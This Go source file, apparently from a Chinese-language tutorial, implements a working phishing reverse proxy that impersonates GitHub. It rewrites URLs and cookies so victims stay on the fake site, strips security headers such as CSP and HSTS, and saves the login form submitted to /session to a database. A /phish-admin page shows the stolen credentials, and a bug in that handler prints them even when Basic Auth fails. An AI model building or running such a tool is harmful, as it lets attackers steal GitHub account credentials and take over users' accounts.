package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"regexp"
	"strings"

	"goPhishing/db"
)

const (
	upstreamURL = "https://github.com"
	phishURL    = "http://localhost:8080"
)

// 用來 handler 所有 request
func handler(w http.ResponseWriter, r *http.Request) {
	req := cloneRequest(r)
	// 取得 body & header
	body, header, statusCode := sendReqToUpstream(req)
	body = replaceURLInResp(body, header)

	// 用 range 把 header 中的 Set-Cookie 欄位全部複製給瀏覽器的 header
	for _, v := range header["Set-Cookie"] {
		// 把 domain=.github.com 移除
		newValue := strings.Replace(v, "domain=.github.com;", "", -1)
		// 把 secure 移除
		newValue = strings.Replace(newValue, "secure;", "", 1)
		// 幫 cookie 改名
		// __Host-user-session -> XXHost-user-session
		// __Secure-cookie-name -> XXSecure-cookie-name
		newValue = strings.Replace(newValue, "__Host", "XXHost", -1)
		newValue = strings.Replace(newValue, "__Secure", "XXSecure", -1)

		w.Header().Add("Set-Cookie", newValue)
	}

	// Set-Cookie 之前已經有複製而且取代 secure, domain 了
	// 所以複製除了 Set-Cookie 之外的 header
	for k := range header {
		if k != "Set-Cookie" {
			value := header.Get(k)
			w.Header().Set(k, value)
		}
	}

	// 把安全性的 header 統統刪掉
	w.Header().Del("Content-Security-Policy")
	w.Header().Del("Strict-Transport-Security")
	w.Header().Del("X-Frame-Options")
	w.Header().Del("X-Xss-Protection")
	w.Header().Del("X-Pjax-Version")
	w.Header().Del("X-Pjax-Url")

	// 如果 status code 是 3XX 就取代 Location 網址
	if statusCode >= 300 && statusCode < 400 {
		location := header.Get("Location")
		newLocation := strings.Replace(location, upstreamURL, phishURL, -1)
		w.Header().Set("Location", newLocation)
	}

	w.WriteHeader(statusCode)
	// 取代後的 body
	w.Write(body)
}

// 將打到 phishing 網站的 request， 複製成要打到真正網站的 request
func cloneRequest(r *http.Request) *http.Request {
	// 取得原請求的 method、body
	method := r.Method

	// 把 body 讀出來轉成 string
	bodyByte, _ := ioutil.ReadAll(r.Body)
	bodyStr := string(bodyByte)

	// 如果是 POST 到 /session 的請求
	// 就把 body 存進資料庫內（帳號密碼 GET !!）
	if r.URL.String() == "/session" && r.Method == "POST" {
		db.Insert(bodyStr)
	}
	body := bytes.NewReader(bodyByte)

	// 取得原請求的 url，把它的域名替換成真正的 Github
	path := r.URL.Path
	rawQuery := r.URL.RawQuery
	url := upstreamURL + path + "?" + rawQuery

	// 建立新的 http.Request
	req, err := http.NewRequest(method, url, body)
	if err != nil {
		panic(err)
	}

	// 複製整個 request header
	req.Header = r.Header

	// 取代 header 中的 Origin, Referer 網址
	origin := strings.Replace(r.Header.Get("Origin"), phishURL, upstreamURL, -1)
	referer := strings.Replace(r.Header.Get("Referer"), phishURL, upstreamURL, -1)
	req.Header.Set("Origin", origin)
	req.Header.Set("Referer", referer)
	// 直接把 Accept-Encoding 刪掉
	req.Header.Del("Accept-Encoding")

	for i, value := range req.Header["Cookie"] {
		// 取代 cookie 名字
		newValue := strings.Replace(value, "XXHost", "__Host", -1)
		newValue = strings.Replace(newValue, "XXSecure", "__Secure", -1)
		req.Header["Cookie"][i] = newValue
	}

	return req
}

// 拿複製的 request 去請求真正的網站
func sendReqToUpstream(req *http.Request) ([]byte, http.Header, int) {
	// 回傳 http.ErrUseLastResponse 這個錯誤他就不會跟隨 redirect 而是直接得到回覆
	checkRedirect := func(r *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}

	// 建立 http client
	client := http.Client{CheckRedirect: checkRedirect}

	// client.Do(req) 會發出請求到 Github、得到回覆 resp
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}

	// 把回覆的 body 從 Reader（串流）轉成 []byte
	respBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	// res.Body 讀取完，要記得 Close，不然會有 memory leak 等相關問題
	resp.Body.Close()

	// 回傳 body + header + status
	return respBody, resp.Header, resp.StatusCode
}

// 將真正網站拿到的 response 在替換成 phishing 的資訊，給瀏覽器
func replaceURLInResp(body []byte, header http.Header) []byte {
	// 判斷 Content-Type 是不是 text/html
	contentType := header.Get("Content-Type")
	isHTML := strings.Contains(contentType, "text/html")

	// 如果不是 HTML 就不取代
	if !isHTML {
		return body
	}

	// 把 https://github.com 取代為 http://localhost:8080
	// strings.Replace 最後一個參數是指最多取代幾個，-1 就是全部都取代
	bodyStr := string(body)
	bodyStr = strings.Replace(bodyStr, upstreamURL, phishURL, -1)

	phishGitURL := fmt.Sprintf(`%s(.*)\.git`, phishURL)
	upstreamGitURL := fmt.Sprintf(`%s$1.git`, upstreamURL)

	// 尋找符合 git 網址的特徵
	re, err := regexp.Compile(phishGitURL)
	if err != nil {
		panic(err)
	}

	// 取代成 github 網址
	bodyStr = re.ReplaceAllString(bodyStr, upstreamGitURL)

	return []byte(bodyStr)
}

func adminHandler(w http.ResponseWriter, r *http.Request) {
	// 取得使用者輸入的帳號密碼
	username, password, ok := r.BasicAuth()

	// 判斷帳密對錯
	if username == "username" && password == "password" && ok {
		// 對的話就從資料庫撈資料
		strs := db.SelectAll()
		w.Write([]byte(strings.Join(strs, "\n\n")))
	} else {
		// 告訴瀏覽器這個頁面需要 Basic Auth
		w.Header().Add("WWW-Authenticate", "Basic")

		// 回傳 `401 Unauthorized`
		w.WriteHeader(401)
		w.Write([]byte("不給你看勒"))
	}

	// 用昨天寫好的 db.SelectAll() 撈到所有資料
	strs := db.SelectAll()

	// 在每個字串之間加兩個換行再傳回前端
	w.Write([]byte(strings.Join(strs, "\n\n")))
}

func main() {
	// 先連接到 DB
	db.Connect()

	// 路徑是 /phish-admin 才交給 adminHandler 處理
	http.HandleFunc("/phish-admin", adminHandler)

	http.HandleFunc("/", handler)
	log.Fatal(http.ListenAndServe(":8080", nil))
}
